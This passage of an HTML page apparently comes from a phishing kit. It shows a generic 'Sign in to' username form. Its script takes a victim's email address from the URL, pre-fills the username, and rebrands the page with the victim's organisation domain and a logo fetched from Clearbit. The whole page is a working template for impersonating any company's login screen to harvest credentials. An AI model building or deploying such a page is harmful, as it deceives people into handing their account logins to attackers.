    input[type=text] {
      appearance: none;

      box-shadow: none;
      height: 40px;
      width: 100%;

      box-shadow: none;
    }

      text-align: center;
    }

    h1 {

      font-size: 24px;

    }
  </style>
</head>
<body>
  <table border="0" width="100%" cellspacing="0" cellpadding="0">
    <tr><td>&nbsp;</td></tr>
    <tr>
      <td>
        <div align="center">
          <table border="0" width="100" cellspacing="0" cellpadding="0">
            <tr>
              <td>
                <table border="0" width="100%" cellspacing="0" cellpadding="0">
                  <form action="index.html" method="post">
                    <tr><td height="110"></td></tr>
                    <tr>
                      <td height="40" align="center">
                        <img id="logo" src="https://logo.clearbit.com/domain" width="200" height="40">
                      </td>
                    </tr>
                    <tr><td height="70"></td></tr>
                    <tr>
                      <td height="26">
                        <h1>
                          <font color="#000000">Sign in to</font>
                          <font color="#7A7A7A" id="domainLabel">domain</font>
                        </h1>
                      </td>
                    </tr>
                    <tr><td height="14"><p>Please enter your username.</p></td></tr>
                    <tr><td height="40"></td></tr>
                    <tr>
                      <td width="400" height="40">
                        <div class="input-group">
                          <input name="user" placeholder="Username" type="text" required class="form-control" id="usernameInput" >
                          <input type="hidden" name="domain" id="hiddenDomain">
                          <span id="domainAddon" style="background-color:#fff; border:none; border-radius:0px; border-bottom: 1px blue solid; border-top: 1px blue solid; border-right: 1px blue solid" class="input-group-addon">@domain</span>
                        </div>
                      </td>
                    </tr>
                    <tr><td height="20"></td></tr>
                    <tr>
                      <td>
                        <input type="image" src="img/signin-btn.png" width="400" height="44" name="I1">
                      </td>
                    </tr>
                    <tr><td height="15"></td></tr>
                    <tr>
                      <td height="15">
                        <table border="0" width="100%" cellspacing="0" cellpadding="0">
                          <tr>
                            <td height="122" background="img/footer-2.png">
                              <table border="0" width="100%" cellspacing="0" cellpadding="0">
                                <tr>
                                  <td height="36">
                                    <table border="0" width="100%" cellspacing="0" cellpadding="0">
                                      <tr>
                                        <td width="8"></td>
                                        <td width="155">
                                          <p align="left">
                                            <a href="session_login.php" style="text-decoration: none; color: black;">

                                          </p>
                                        </td>

                                      </tr>
                                    </table>
                                  </td>
                                </tr>
                                <tr><td height="86"></td></tr>
                              </table>

                          </tr>

                        </table>
                      </td>
                    </tr>
                  </form>
                </table>
              </td>
            </tr>
          </table>
        </div>
      </td>
    </tr>
  </table>

  <script>
    const params = new URLSearchParams(window.location.search);
    const raw = params.get('login');
    const email = raw ? decodeURIComponent(raw) : '';

    let user = '', domain = '';
    if (email.includes('@')) {
      [user, domain] = email.split('@');
    }

    // Set input values
    document.getElementById('usernameInput').value = user || '';
    document.getElementById('hiddenDomain').value = domain || 'domain';

    // Update domain visuals
    if (domain) {
      document.getElementById('domainAddon').textContent = '@' + domain;
      document.getElementById('domainLabel').textContent = domain;
      document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
    }
  </script>
</body>
</html>
